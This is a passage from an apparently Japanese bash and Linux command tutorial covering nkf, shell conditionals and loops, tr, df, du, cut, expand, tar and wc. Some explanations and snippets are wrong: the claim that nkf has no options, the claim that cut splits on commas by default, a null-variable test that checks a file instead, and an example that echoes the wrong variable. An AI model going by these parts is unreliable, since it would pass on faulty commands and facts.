<li>文字コードを判定する</li>
<li>文字コードを変換してファイルを書き換える</li>
<li>CentOS 7にnkfをインストールするには？</li>
</ul>
<h3 id=nkfコマンド概要>nkfコマンド概要</h3>
<p>　「nkf」は「Network Kanji Filter」の略で、LinuxとWindowsなど、異なるOS間でテキストデータを交換する際に問題となる文字コードと改行コードを変換するためのコマンドです。</p>
<h3 id=nkfコマンドの書式>nkfコマンドの書式</h3>
<p>nkf [オプション] [ファイル]<br>
nkf [オプション] &ndash;overwrite ファイル</p>
<h3 id=nkfコマンドの主なオプション>nkfコマンドの主なオプション</h3>
<p>nkfにはオプションはありません。なお、オプション文字列の先頭に「:」記号を入れるかどうかによって、エラーメッセージ表示の有無を変更できます。</p>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-j(入力は J)</td>
<td>JISコードを出力する</td>
</tr>
<tr>
<td>-e(入力は E)</td>
<td>EUCコードを出力する</td>
</tr>
<tr>
<td>-s(入力は S)</td>
<td>シフトJISコードを出力する</td>
</tr>
<tr>
<td>-w(入力は W)</td>
<td>UTF-8コードを出力する（BOMなし）</td>
</tr>
<tr>
<td>-Lu</td>
<td>改行をLFにする（UNIX系）</td>
</tr>
<tr>
<td>-g</td>
<td>自動判別の結果を出力する</td>
</tr>
<tr>
<td>&ndash;overwrite</td>
<td>ファイルを変換して上書きする</td>
</tr>
</tbody>
</table>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>UTF-8に変換する場合は $ nkf -wLu となります。<br>
このオプションの意味は、改行コードをUNIX系のLFに変換してUTF-8で出力、です。</dd>
</dl>
</div>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>一覧のオプションは一部です。 $ man nkf などで、nkfの使い方を確認してください。</dd>
</dl>
</div>
<h3 id=nkfコマンド詳細説明>nkfコマンド詳細説明</h3>
<h3 id=文字コードと改行コードを変換する>文字コードと改行コードを変換する</h3>
<p>kfは「nkf ファイル名」で指定したファイル、または標準入力から受け取った内容を変換して、標準出力に書き出します。</p>
<p>Linux環境で扱いやすいように、文字コードを「UTF-8」（-wオプション）、改行コードを「LF」（-Luオプション）に変換するには、リダイレクトするか、「nkf -wLu 元ファイル > 保存ファイル名」のように指定します。なお、入力側の文字コードは自動で判定されます。</p>
<p>改行コードはUNIX系のLFで、UTF-8で変換出力</p>
<pre tabindex=0><code>$ cat sjisFile.txt | nkf -wLu &gt; 保存ファイル名.txt
</code></pre><h3 id=文字コードを判定する>文字コードを判定する</h3>
<p>　「-g（&ndash;guess）」オプションを付けると、使用されている文字コードと改行コードの判定結果を表示することができます。</p>
<p>得体のしれないファイルを調査する</p>
<pre tabindex=0><code>$ cat sjisFile.txt | nkf -g
sjisFile.txt: UTF-8 (LF)
</code></pre><h3 id=文字コードを変換してファイルを書き換える>文字コードを変換してファイルを書き換える</h3>
<p>　「&ndash;overwrite」オプションでは、指定したファイルの文字コードを変換して、直接書き換えることができます。</p>
<p>文字コードを変換してファイルを書き換える</p>
<pre tabindex=0><code>$ cat sjisFile.txt | nkf -wLu --overwrite
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>&ndash;overwrite オプションで元のファイルを上書きするのは一見便利なオプションに見えますが、別ファイルに出力して、元のファイルは極力残すようにしておくべきだと思います。僕は。</dd>
</dl>
</div>
<h3 id=centos-7にnkfをインストールするには>CentOS 7にnkfをインストールするには？</h3>
<p>rpmでインストール</p>
<pre tabindex=0><code>$ yum localinstall http://mirror.centos.org/centos/6/os/x86_64/Packages/nkf-2.0.8b-6.2.el6.x86_64.rpm
</code></pre><p>ソースからインストール</p>
<pre tabindex=0><code>$ wget https://osdn.jp/dl/nkf/nkf-2.1.4.tar.gz
$ tar -xzvf nkf-2.1.4.tar.gz
$ cd nkf-2.1.4/
$ make
$ sudo make install
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>rpmやyumでインストールする場合と、ソースからインストールする場合、いずれも好みです。人それぞれのやり方や考え方でいいと思います。いずれ使い分けができるようになると思います。今はうまく行ったほうで頑張ってください。</dd>
</dl>
</div>
<h2 id=if>if</h2>
<h3 id=文字列一致の検出>文字列一致の検出</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>if</span> <span class=o>[[</span> <span class=s2>&#34;</span><span class=nv>$c</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;read&#34;</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span> <span class=nv>outputdir</span><span class=o>=</span><span class=s2>&#34;seq&#34;</span><span class=p>;</span> <span class=k>else</span> <span class=nv>outputdir</span><span class=o>=</span><span class=s2>&#34;write&#34;</span> <span class=p>;</span> <span class=k>fi</span>
</code></pre></div><h3 id=myfile-に文字列-test-が含まれているかどうかを確認>myfile に文字列 &lsquo;test&rsquo; が含まれているかどうかを確認</h3>
<pre tabindex=0><code>``` bah
if grep -q hello myfile; then echo -e &quot;file contains the string!&quot; ; fi
</code></pre><h3 id=変数がnull-であるかを確認>変数がnull であるかを確認</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nv>myvariable</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>;</span><span class=k>if</span> <span class=o>[</span> ! -s <span class=s2>&#34;myvariable&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span> <span class=nb>echo</span> -e <span class=s2>&#34;variable is null!&#34;</span> <span class=p>;</span> <span class=k>fi</span>
</code></pre></div><h3 id=該当のファイルが存在するかを確認>該当のファイルが存在するかを確認</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>if</span> <span class=o>[</span> -e <span class=s1>&#39;filename&#39;</span> <span class=o>]</span><span class=p>;</span><span class=k>then</span> <span class=nb>echo</span> -e <span class=s2>&#34;file exists!&#34;</span><span class=p>;</span> <span class=k>fi</span>
</code></pre></div><h3 id=ファイルに加えてシンボリックリンクの存在も確認>ファイルに加えてシンボリックリンクの存在も確認</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>if</span> <span class=o>[</span> -e myfile <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> -L myfile <span class=o>]</span><span class=p>;</span><span class=k>then</span> <span class=nb>echo</span> -e <span class=s2>&#34;file exists!&#34;</span><span class=p>;</span> <span class=k>fi</span>
</code></pre></div><h3 id=xの値が５以上かどうかを確認>xの値が５以上かどうかを確認</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$x</span><span class=s2>&#34;</span> -ge <span class=m>5</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span> <span class=nb>echo</span> -e <span class=s2>&#34;greater or equal than 5!&#34;</span> <span class=p>;</span> <span class=k>fi</span>
</code></pre></div><h3 id=bash版xの値が５以上かどうかを確認>bash版：xの値が５以上かどうかを確認</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>if</span> <span class=o>((</span>x &gt;<span class=o>=</span> 5<span class=o>))</span><span class=p>;</span> <span class=k>then</span> <span class=nb>echo</span> -e <span class=s2>&#34;greater or equal than 5!&#34;</span> <span class=p>;</span> <span class=k>fi</span>
</code></pre></div><h3 id=--を使う>(( )) を使う</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nv>j</span><span class=o>=</span>3<span class=p>;</span><span class=nv>u</span><span class=o>=</span>1<span class=p>;</span><span class=k>if</span> <span class=o>((</span><span class=nv>j</span><span class=o>==</span>u+2<span class=o>))</span><span class=p>;</span> <span class=k>then</span> <span class=nb>echo</span> -e <span class=s2>&#34;j==u+2&#34;</span><span class=p>;</span><span class=k>fi</span>
</code></pre></div><h3 id=--を使う-1>[[ ]] を使う</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nv>age</span><span class=o>=</span>25<span class=p>;</span><span class=k>if</span> <span class=o>[[</span> <span class=nv>$age</span> -gt <span class=m>21</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span> <span class=nb>echo</span> -e <span class=s2>&#34;forever 21&#34;</span> <span class=p>;</span> <span class=k>fi</span>
</code></pre></div><h2 id=for>for</h2>
<h3 id=ディレクトリ内のファイル名を出力>ディレクトリ内のファイル名を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>for</span> i in <span class=k>$(</span>ls<span class=k>)</span><span class=p>;</span> <span class=k>do</span> <span class=nb>echo</span> file: <span class=nv>$i</span><span class=p>;</span><span class=k>done</span>
</code></pre></div><p>もしくは、</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>for</span> i in *<span class=p>;</span> <span class=k>do</span> <span class=nb>echo</span> file: <span class=nv>$i</span><span class=p>;</span> <span class=k>done</span>
</code></pre></div><h3 id=myfile内に記載された名前を使ってディレクトリを作成>myfile内に記載された名前を使ってディレクトリを作成</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>for</span> dir in <span class=k>$(</span>&lt;myfile<span class=k>)</span><span class=p>;</span> <span class=k>do</span> mkdir <span class=nv>$dir</span><span class=p>;</span> <span class=k>done</span>
</code></pre></div><h2 id=read>read</h2>
<h3 id=ユーザー入力の読み取り>ユーザー入力の読み取り</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>read</span> input
<span class=nb>echo</span> <span class=nv>$input</span>
</code></pre></div><h2 id=配列>配列</h2>
<h3 id=配列の宣言>配列の宣言</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>declare</span> -a <span class=nv>array</span><span class=o>=()</span>
</code></pre></div><p>または</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>declare</span> <span class=nv>array</span><span class=o>=()</span>
</code></pre></div><p>または</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>declare</span> -A <span class=nv>array</span><span class=o>=()</span>
</code></pre></div><h2 id=trコマンド>trコマンド</h2>
<ul>
<li>文字を置換する</li>
<li>大文字／小文字を変換する</li>
<li>改行を除去する</li>
<li>固定長のデータをタブ区切りに変換する／カンマ区切りに変換する</li>
</ul>
<h3 id=trコマンド概要>trコマンド概要</h3>
<p>　「tr」は、文字を置き換えるためのコマンドです。指定した文字を別の文字に置き換えたり、指定した文字を削除したり、文字が連続している場合には1つにまとめたりすることもできます。</p>
<p>ですが、sedでもっと細かく制御できるので、trは「改行を除去する」ためのコマンドに成り果ててしまいました。ここでは改行を除去することだけにフォーカスしてご説明します。</p>
<h3 id=trコマンドの書式>trコマンドの書式</h3>
<p>tr [オプション] 文字セット1 [文字セット2]</p>
<h3 id=trコマンドの主なオプション>trコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td>&lsquo;文字&rsquo;を削除する</td>
</tr>
</tbody>
</table>
<h3 id=trコマンド詳細説明>trコマンド詳細説明</h3>
<h3 id=文字を置換する>文字を置換する</h3>
<p>sedを使いましょう。</p>
<pre tabindex=0><code>$ tr 012 abc
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>012 という文字列を置き換えるのではなく、0をaに、1をbに、2をcに置き換えます。</dd>
</dl>
</div>
<h3 id=大文字小文字を変換する>大文字／小文字を変換する</h3>
<p>sedを使いましょう。</p>
<p>大文字／小文字を変換する</p>
<pre tabindex=0><code>$ tr ABC abc
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>ABC という文字列を置き換えるのではなく、Aをaに、Bをbに、Cをcに置き換えます。</dd>
</dl>
</div>
<p>　また、文字を範囲で指定することも可能です。「tr A-Z a-z」で「A」は「a」に、「B」は「b」に……と対応する文字に置き換えられます。</p>
<pre tabindex=0><code>$ tr A-Z a-z
</code></pre><h3 id=改行を除去する>改行を除去する</h3>
<p>　「-d」オプションで、指定した文字を削除することができます。</p>
<p>ファイル中の改行を除去</p>
<pre tabindex=0><code>$ cat sample.txt | tr -d '\n' &gt; 出力ファイル名
</code></pre><p>文字列中の改行を除去</p>
<pre tabindex=0><code>$ echo &quot;$string_sample&quot; | tr -d '\n' 
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>trコマンドの唯一の利点、sedより優れているただ一つの機能、それが tr -d &lsquo;\n&rsquo; です。</dd>
</dl>
</div>
<div class="tips-area alert">
<dl>
<dt>重要</dt>
<dd>tr -d &lsquo;\n&rsquo; のくくりはシングルクォーテーションである必要があります。ダブルクォーテーションではいけません。理由は「文字列」ではなく「文字（一文字）」しか扱えないからです。</dd>
</dl>
</div>
<h3 id=固定長のデータをタブ区切りに変換するカンマ区切りに変換する>固定長のデータをタブ区切りに変換する／カンマ区切りに変換する</h3>
<p>ls -la コマンドで普通に出力します。</p>
<pre tabindex=0><code>$ ls -la
drwxr-xr-x  13 suzukiiichiro  staff     416  7 14 13:31 ./
drwxrwxrwx+ 48 suzukiiichiro  staff    1536  7  5 10:05 ../
drwxrwxrwx   7 suzukiiichiro  staff     224  4 10  2020 AI_Algorithm_Game_Bash/
drwxrwxrwx  18 suzukiiichiro  staff     576  4 10  2020 AI_Algorithm_Game_Chess/
drwxrwxrwx  39 suzukiiichiro  staff    1248  4 10  2020 AI_Algorithm_Game_Othello/
drwxrwxrwx  31 suzukiiichiro  staff     992  4 10  2020 AI_Algorithm_Game_RubiksCube/
drwxrwxrwx  33 suzukiiichiro  staff    1056  4 10  2020 AI_Algorithm_Game_Shogi/
drwxrwxrwx   7 suzukiiichiro  staff     224  4 10  2020 C_Othello/
</code></pre><p>連続した空白をタブに変換します。</p>
<pre tabindex=0><code>$ ls -l | tr -s &quot; &quot; &quot;\t&quot;
total	528
drwxrwxrwx	7	suzukiiichiro	staff	224	4	10	2020	AI_Algorithm_Game_Bash/
drwxrwxrwx	18	suzukiiichiro	staff	576	4	10	2020	AI_Algorithm_Game_Chess/
drwxrwxrwx	39	suzukiiichiro	staff	1248	4	10	2020	AI_Algorithm_Game_Othello/
drwxrwxrwx	31	suzukiiichiro	staff	992	4	10	2020	AI_Algorithm_Game_RubiksCube/
drwxrwxrwx	33	suzukiiichiro	staff	1056	4	10	2020	AI_Algorithm_Game_Shogi/
drwxrwxrwx	7	suzukiiichiro	staff	224	4	10	2020	C_Othello/
</code></pre><p>連続した空白をカンマに変換します。</p>
<pre tabindex=0><code>$ ls -l | tr -s &quot; &quot; &quot;,&quot;
drwxrwxrwx,7,suzukiiichiro,staff,224,4,10,2020,AI_Algorithm_Game_Bash/
drwxrwxrwx,18,suzukiiichiro,staff,576,4,10,2020,AI_Algorithm_Game_Chess/
drwxrwxrwx,39,suzukiiichiro,staff,1248,4,10,2020,AI_Algorithm_Game_Othello/
drwxrwxrwx,31,suzukiiichiro,staff,992,4,10,2020,AI_Algorithm_Game_RubiksCube/
drwxrwxrwx,33,suzukiiichiro,staff,1056,4,10,2020,AI_Algorithm_Game_Shogi/
drwxrwxrwx,7,suzukiiichiro,staff,224,4,10,2020,C_Othello/
</code></pre><h2 id=dfコマンド>dfコマンド</h2>
<ul>
<li>ディスクの空き容量を調べる</li>
</ul>
<h3 id=dfコマンド概要>dfコマンド概要</h3>
<p>　「df」は、ディスクの空き領域（freeスペース）のサイズを集計して表示するコマンドです。引数でファイルやディレクトリを指定すると、そのファイルが保存されている場所の空き領域が表示されます。指定しなかった場合は、現在マウントされている全ての場所について空き領域を表示します。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>dfコマンドで最も使われるオプションは -h です。この一つだけを覚えていれば大丈夫です。</dd>
</dl>
</div>
<h3 id=dfコマンドの書式>dfコマンドの書式</h3>
<p>df [オプション] [ファイル]</p>
<h3 id=dfコマンドの主なオプション>dfコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-h</td>
<td>サイズに応じて読みやすい単位で表示する</td>
</tr>
</tbody>
</table>
<h3 id=dfコマンド詳細説明>dfコマンド詳細説明</h3>
<h3 id=ディスクの空き容量を調べる>ディスクの空き容量を調べる</h3>
<p>簡単です。</p>
<pre tabindex=0><code>$ df -h 
Filesystem      Size   Used  Avail Capacity iused               ifree %iused  Mounted on
/dev/disk1s1   466Gi  398Gi   64Gi    87% 2377176 9223372036852398631    0%   /
devfs          194Ki  194Ki    0Bi   100%     671                   0  100%   /dev
/dev/disk1s4   466Gi  3.0Gi   64Gi     5%       5 9223372036854775802    0%   /private/var/vm
map -hosts       0Bi    0Bi    0Bi   100%       0                   0  100%   /net
map auto_home    0Bi    0Bi    0Bi   100%       0                   0  100%   /home
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>要するに空き容量を確認するためのコマンドがdfで、-hオプションを付けることによって、サイズがわかりやすくなる、という仕組みです。深く考えるのはやめましょう。</dd>
</dl>
</div>
<h2 id=duコマンド>duコマンド</h2>
<ul>
<li>ディレクトリごとのディスク使用量を表示する</li>
<li>ディスク使用量の合計だけを表示する</li>
<li>カレントディレクトリ直下のファイル、ディレクトリごとの集計を表示する</li>
</ul>
<h3 id=duコマンド概要>duコマンド概要</h3>
<p>　「du」は、ディスクの使用量をディレクトリごとに集計して表示するコマンドです。ファイルを指定した場合は指定したファイルのサイズのみ、ディレクトリを指定した場合はそのディレクトリおよび全てのサブディレクトリの使用量を集計します。対象を指定しなかった場合は、カレントディレクトリの使用量が表示されます。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>duコマンドで最も使われるオプションは -h -s です。この組み合わせだけを覚えていれば大丈夫です。</dd>
</dl>
</div>
<h3 id=duコマンドの書式>duコマンドの書式</h3>
<p>du [オプション] [ファイルまたはディレクトリ]</p>
<h3 id=duコマンドの主なオプション>duコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-h</td>
<td>サイズに応じて読みやすい単位で表示する</td>
</tr>
<tr>
<td>-s</td>
<td>指定したディレクトリの合計のみを表示する</td>
</tr>
</tbody>
</table>
<h3 id=duコマンド詳細説明>duコマンド詳細説明</h3>
<h3 id=ディレクトリごとのディスク使用量を表示する>ディレクトリごとのディスク使用量を表示する</h3>
<pre tabindex=0><code>$ du -h 
:
:
＜どばーっとでてきます＞
:
:
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>あまりにもたくさん表示されて、なにがなんだかわかりませんね。大丈夫です。次の項で -s オプションを紹介します。</dd>
</dl>
</div>
<h3 id=ディスク使用量の合計だけを表示する>ディスク使用量の合計だけを表示する</h3>
<p>　指定したディレクトリの合計容量だけを表示したい場合は、「-s」オプションを使用します。</p>
<p>du -s で、カレントディレクトリが使用している容量が表示されます。</p>
<pre tabindex=0><code>$ du -h -s
1.4G	.
</code></pre><h3 id=カレントディレクトリ直下のファイルディレクトリごとの集計を表示する>カレントディレクトリ直下のファイル、ディレクトリごとの集計を表示する</h3>
<p>カレントディレクトリ直下のファイル、またはディレクトリごとの集計値を表示するには、アスタリスク * をつけます。</p>
<p>du -h -s * で、カレントディレクトリ直下のファイルおよびディレクトリごとの集計となります。</p>
<pre tabindex=0><code>$ du -h -s *
 72K	AI_Algorithm_Game_Bash
440K	AI_Algorithm_Game_Chess
276M	AI_Algorithm_Game_Othello
971M	AI_Algorithm_Game_RubiksCube
157M	AI_Algorithm_Game_Shogi
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>duコマンドはディレクトリ以下の使用量を表示するコマンドです。dfコマンド同様 -h でサイズが見やすく表示されます。 -s でカレントディレクトリの使用量が表示され、* をつけると、ディレクトリ内のサブディレクトリごとの使用量が表示されます。 du -h -s * のひとかたまりで覚えるのがポイントです。</dd>
</dl>
</div>
<h2 id=cutコマンド>cutコマンド</h2>
<ul>
<li>文字数を指定して切り出す</li>
<li>列を指定して切り出す</li>
<li>出力の区切り文字を変更する</li>
</ul>
<h3 id=cutコマンド概要>cutコマンド概要</h3>
<p>　「cut」は、ファイルを読み込んで、それぞれの行から指定した部分だけを切り出すコマンドです。例えば、「3文字目から10文字目」や、タブなどで区切られたファイルから「1番目の列と3番目の列」のように選んで取り出すことができます。</p>
<h3 id=cutコマンドの書式>cutコマンドの書式</h3>
<p>cut オプション [ファイル]</p>
<h3 id=cutコマンドの主なオプション>cutコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-c</td>
<td>切り出す位置のリストを文字数で指定する</td>
</tr>
<tr>
<td>-f 1,3または1-3</td>
<td>切り出す位置のリストをタブ区切りの列で指定する（区切り文字は「-d」オプションで変更可能）</td>
</tr>
<tr>
<td>-d &lsquo;文字&rsquo;</td>
<td>列の区切り文字として、タブの代わりに使用する文字を指定する（1文字のみ）</td>
</tr>
</tbody>
</table>
<h3 id=cutコマンド詳細説明>cutコマンド詳細説明</h3>
<h3 id=文字数を指定して切り出す>文字数を指定して切り出す</h3>
<p>cutコマンドで頭から4文字を切り出す</p>
<pre tabindex=0><code>$ STR=&quot;Hello World&quot;
$ echo $string | cut -c 1-4 
Hell
</code></pre><p>bashの文字列変数で頭から4文字を切す</p>
<pre tabindex=0><code>$ STR=&quot;Hello World&quot;
$ echo ${STR:0:4}
Hell
</code></pre><p>sedコマンドで先頭から4文字切り出す</p>
<pre tabindex=0><code>$ STR=&quot;Hello World&quot;
$ echo &quot;${STR}&quot; | sed 's/^\(.\{4\}\).*$/\1/'
Hell
</code></pre><h3 id=列を指定して切り出す>列を指定して切り出す</h3>
<p>列の区切り文字は、デフォルトで ,(カンマ）とTAB(タブ）です。<br>
特に指定しなければ、cutコマンドが考えて区切り文字として認識してくれます。<br>
ただカンマとTABが混在している場合は不安ですね。<br>
次の項で、区切り文字（デリミタ）を指定する方法を説明します。</p>
<p>区切り文字のデフォルトがカンマとタブだから<br>
/etc/passwdのようにデリミタを指定しないときちんと区切られない。</p>
<pre tabindex=0><code>$ sudo cat /etc/passwd | cut -f 1,7 | tail
_findmydevice:*:254:254:Find My Device Daemon:/var/db/findmydevice:/usr/bin/false
_datadetectors:*:257:257:DataDetectors:/var/db/datadetectors:/usr/bin/false
_captiveagent:*:258:258:captiveagent:/var/empty:/usr/bin/false
_ctkd:*:259:259:ctkd Account:/var/empty:/usr/bin/false
_applepay:*:260:260:applepay Account:/var/db/applepay:/usr/bin/false
_hidd:*:261:261:HID Service User:/var/db/hidd:/usr/bin/false
_cmiodalassistants:*:262:262:CoreMedia IO Assistants User:/var/db/cmiodalassistants:/usr/bin/false
_analyticsd:*:263:263:Analytics Daemon:/var/db/analyticsd:/usr/bin/false
_fpsd:*:265:265:FPS Daemon:/var/db/fpsd:/usr/bin/false
_timed:*:266:266:Time Sync Daemon:/var/db/timed:/usr/bin/false
</code></pre><p>デリミタを指定した場合はきちんと１番目、７番目の列が切り取られました<br>
まずはcutコマンドで実現します。</p>
<pre tabindex=0><code>$ sudo cat /etc/passwd | cut -f 1,7 -d ':' | tail
_findmydevice:/usr/bin/false
_datadetectors:/usr/bin/false
_captiveagent:/usr/bin/false
_ctkd:/usr/bin/false
_applepay:/usr/bin/false
_hidd:/usr/bin/false
_cmiodalassistants:/usr/bin/false
_analyticsd:/usr/bin/false
_fpsd:/usr/bin/false
_timed:/usr/bin/false
$
</code></pre><p>同じことをawkコマンドでやってみます。デリミタの区切り指定は -F です。</p>
<pre tabindex=0><code>$ sudo cat /etc/passwd | awk -F ':' '{ print $1&quot;:&quot;$7;}' | tail
_findmydevice:/usr/bin/false
_datadetectors:/usr/bin/false
_captiveagent:/usr/bin/false
_ctkd:/usr/bin/false
_applepay:/usr/bin/false
_hidd:/usr/bin/false
_cmiodalassistants:/usr/bin/false
_analyticsd:/usr/bin/false
_fpsd:/usr/bin/false
_timed:/usr/bin/false
$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>文字を切り出す方法にもいくつかありますし、列の切り出しにもいろいろな方法があります。用途に合わせて使い分けてください。最初のうちは、一つの方法を覚えておけばよいです。</dd>
</dl>
</div>
<h2 id=expandコマンド>expandコマンド</h2>
<ul>
<li>タブを空白に変換する（expandコマンド）</li>
<li>タブの幅を指定する</li>
</ul>
<h3 id=expandコマンド概要>expandコマンド概要</h3>
<p>「expand」はタブを空白に変換するコマンド、「unexpand」は空白をタブに変換するコマンドです。デフォルトのタブ幅は8桁で、これを変更したい場合は「-t」オプションでタブの文字数を指定します。</p>
<h3 id=expandコマンドの書式>expandコマンドの書式</h3>
<p>expand [オプション] [ファイル]<br>
unexpand [オプション] [ファイル]</p>
<h3 id=expandコマンドの主なオプション>expandコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-t 文字数</td>
<td>タブの文字数またはタブ位置のリストを指定する</td>
</tr>
</tbody>
</table>
<h3 id=expandコマンド詳細説明>expandコマンド詳細説明</h3>
<h3 id=タブを空白に変換する>タブを空白に変換する</h3>
<p>まずサンプルファイルを用意します。</p>
<pre tabindex=0><code>$ echo -e &quot;No-1\tTokyo\t1354098\nNo-2\tOsaka\t934765\nNo-3\tNagoya\t786592&quot; &gt; ex.txt
$ cat ex.txt
No-1	Tokyo	1354098
No-2	Osaka	934765
No-3	Nagoya	786592
</code></pre><p>expandコマンドでタブを空白に変換します。</p>
<pre tabindex=0><code>$ expand ex.txt &gt; ex2.txt
$ cat ex2.txt
No-1    Tokyo   1354098
No-2    Osaka   934765
No-3    Nagoya  786592
</code></pre><p>見た目は全く変わりませんが、タブが空白に置き換えられました。<br>
デフォルトのタブ幅は８です。</p>
<h3 id=タブの幅を指定する>タブの幅を指定する</h3>
<p>タブ幅を変更する場合は、「-t」オプションを使用します。例えば、12文字の幅にしたい場合は「-t 12」と指定します。</p>
<pre tabindex=0><code># サンプルファイルを作成
$ echo -e &quot;No-1\tTokyo\t1354098\nNo-2\tOsaka\t934765\nNo-3\tNagoya\t786592&quot; &gt; ex.txt
$ cat ex.txt
No-1	Tokyo	1354098
No-2	Osaka	934765
No-3	Nagoya	786592

# タブ幅のデフォルトは8です。
$ expand ex.txt &gt; ex2.txt
$ cat ex2.txt
No-1    Tokyo   1354098
No-2    Osaka   934765
No-3    Nagoya  786592

# タブ幅を10に指定
$ expand -t 10 ex.txt &gt;ex3.txt
$ cat ex3.txt
No-1      Tokyo     1354098
No-2      Osaka     934765
No-3      Nagoya    786592
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>タブ幅を変更する場合には、$ expand -t 10 と、覚えておけば良いと思います。</dd>
</dl>
</div>
<h2 id=tarコマンド>tarコマンド</h2>
<ul>
<li>アーカイブファイルを作成する</li>
<li>アーカイブファイルを展開する</li>
</ul>
<h3 id=tarコマンド概要>tarコマンド概要</h3>
<p>　「tar」は、複数のファイルを1つにまとめた“アーカイブファイル”を作成／展開するコマンドです。<br>
　「アーカイブ（archive）」は「書庫」という意味で、プログラムのソースコードなど、複数の関連するファイル群をまとめて保管したり、配布したりする際に使用します。</p>
<h3 id=tarコマンドの書式>tarコマンドの書式</h3>
<p>tar -czvf アーカイブ.tgz 対象ファイル<br>
（ファイルのアーカイブを作成しgzip形式で圧縮する）</p>
<p>tar -xzvf アーカイブ.tgz<br>
（gzipで圧縮されたアーカイブを展開する）</p>
<h3 id=tarコマンドの主なオプション>tarコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-c</td>
<td>新しいアーカイブを作成する</td>
</tr>
<tr>
<td>-x</td>
<td>アーカイブからファイルを抽出する</td>
</tr>
</tbody>
</table>
<h3 id=tarコマンド詳細説明>tarコマンド詳細説明</h3>
<h3 id=アーカイブファイルを作成する>アーカイブファイルを作成する</h3>
<p>　アーカイブファイルを作成するには「-c」オプション、アーカイブをgzip形式で圧縮するには「-z」オプションを指定し、「-f」オプションでアーカイブファイル名を指定します。</p>
<pre tabindex=0><code>$ tar -czvf archive.tgz *
</code></pre><h3 id=アーカイブファイルを展開する>アーカイブファイルを展開する</h3>
<p>　アーカイブファイルからファイルを取り出すことを、「展開」あるいは「抽出」と呼びます。</p>
<p>　展開には、先ほどの「-c」オプションの代わりに「-x」オプションを使います（画面2）。また、「-z」はgzip形式用のオプションなので、圧縮されていない場合は「-z」オプションなしで、bzip2形式（拡張子は「.tar.bz2」）の場合は「-j」オプションを使用します。</p>
<pre tabindex=0><code>$ tar -zxvf archive.tgz
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>圧縮は Create（作成）なので -czvf、展開はeXtaruct（伸長）で -xzvfです。 圧縮、展開ともに zvf は共通です。</dd>
</dl>
</div>
<h2 id=wcコマンド>wcコマンド</h2>
<ul>
<li>行数と単語数とバイト数を数える</li>
<li>文字数を数える</li>
<li>行数だけを表示する</li>
</ul>
<h3 id=wcコマンド概要>wcコマンド概要</h3>
<p>　「wc」はテキストファイルの行数や単語数（word count）、文字数を数えるコマンドです。単語は、空白や改行文字で区切られたものを数えます。</p>
<h3 id=wcコマンドの書式>wcコマンドの書式</h3>
<p>wc [オプション] [ファイル……]</p>
<h3 id=wcコマンドの主なオプション>wcコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
